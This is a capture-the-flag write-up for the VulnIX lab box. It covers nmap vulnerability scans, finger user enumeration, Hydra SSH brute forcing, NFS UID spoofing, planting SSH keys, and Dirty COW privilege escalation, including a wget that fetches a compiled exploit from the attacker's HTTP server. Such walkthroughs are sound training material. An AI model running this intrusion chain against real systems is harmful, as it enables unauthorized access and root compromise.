# VULNIX writeup

1. **nmap -p- Target_ip**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled.png)

 **2.   nmap -sV -A —script vuln Target_ip** 

```jsx
root@v5ha1i:~# nmap -sV -A --script Vuln 192.168.122.130
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-18 02:23 EDT
Nmap scan report for 192.168.122.130
Host is up (0.0017s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp?
|_sslv2-drown: 
79/tcp   open  finger     Linux fingerd
110/tcp  open  pop3?
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.cvedetails.com/cve/2014-0224
|   ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      37593/udp  mountd
|   100005  1,2,3      57395/tcp  mountd
|   100021  1,3,4      47147/tcp  nlockmgr
|   100021  1,3,4      48211/udp  nlockmgr
|   100024  1          38105/tcp  status
|   100024  1          42237/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
143/tcp  open  imap       Dovecot imapd
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       http://osvdb.org/113251
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown: 
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell      Netkit rshd
993/tcp  open  ssl/imap   Dovecot imapd
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.cvedetails.com/cve/2014-0224
995/tcp  open  ssl/pop3s?
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
2049/tcp open  nfs_acl    2-3 (RPC #100227)
MAC Address: 00:0C:29:06:17:8C (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.70 ms 192.168.122.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.38 seconds
root@v5ha1i:~# 
```

# ENUMERATION

### User enumeration  (PORT-79)

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%201.png)

***Using tool finger-user-enum to find users in target system

Download finger-user-enum using command **git clone [https://github.com/pentestmonkey/finger-user-enum.git](https://github.com/pentestmonkey/finger-user-enum.git)**

**./finger-user-enum.pl -U <wordlist> -t <target>**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%202.png)

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%203.png)

### LOGIN USING SSH as user

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%204.png)

**Bruteforce password for ssh using hydra**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%205.png)

***successfuly login using ssh

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%206.png)

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%207.png)

## EXPLOITATION METHOD 1

Found user vulnix

Mounting nfs sharing

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%208.png)

***Permission denied

Add user vulnix with same user and group id as target system and then try to access shared folder

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%209.png)

## EXPLOITATION METHOD 2

### NFS Enumeration (PORT-2049)

 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2010.png)

 1.  showmount -e Target

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2011.png)

 2.  **make share directory in /tmp dir**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2012.png)

 3.  **mount -t nfs target:/home/vulnix /tmp/share**

check permission of /tmp/share (user=nobody and group=nobody)

**share directory is not accessible directly

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2013.png)

**Cloning user vulnix using python script**

*** To access share directory, you have to clone user id which is used by target system as nfs user.

Python script to clone user.

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2014.png)

 4.  Make user vulnix using command = **adduser vulnix**  and assign password

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2015.png)

Before running python script delete vulnix user from /etc/passwd and save.

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2016.png)

 5.  Make sure to give write permission for other users to /etc/passwd file.

**chmod 777 /etc/passwd**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2017.png)

***Login with another user and copy python script there.

 6.  Run script using command = **sudo python3 nfs-exploit.py**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2018.png)

***If it gives above error, then add in /etc/sudoers file

**<user>     ALL=(ALL:ALL) ALL**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2019.png)

 7.  Run script again

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2020.png)

 8.  Now we got user and group id for user vulnix

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2021.png)

 9.  Login with vulnix user and try to access /tmp/share directory.

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2022.png)

*** Access successfully

# Login with SSH as vulnix user

 1.  Generate ssh key using **ssh-keygen** command.

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2023.png)

 2.   Copy id_rsa.pub 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2024.png)

 3.  make .ssh directory in /tmp/share/ directory from vulnix user 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2025.png)

 4.  make file authorized_keys in .ssh and paste public key there.

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2026.png)

 5.  login using **ssh vulnix@target_ip**

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2027.png)

# PRIVILEGE ESCALATION

 1.  Download dirty_cow exploit from exploit-db

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2028.png)

 2.  Compile it using command

**gcc 40838.c -lcrypt - pthread -o exp**

And share it using python server 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2029.png)

 3.  Download exploit in target system using wget command

**wget [http://192.168.122.1](http://192.168.122.135)45:8000/exp .** 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2030.png)

 4. **./exp** (to exploit)

It will ask you to enter any password 

*** This script will pawn root user as firefart user

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2031.png)

 5.  Login with ssh as firefart user 

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2032.png)

 6.  Open /etc/passwd file

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2033.png)

 7.  change firefart to root

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2034.png)

8.  Then again login with ssh as root user

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2035.png)

Finally we got root shell and flag in trophy.txt

![VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png](VULNIX%20writeup%20a1b877d552164bc38fb7d0a5a578920c/Untitled%2036.png)
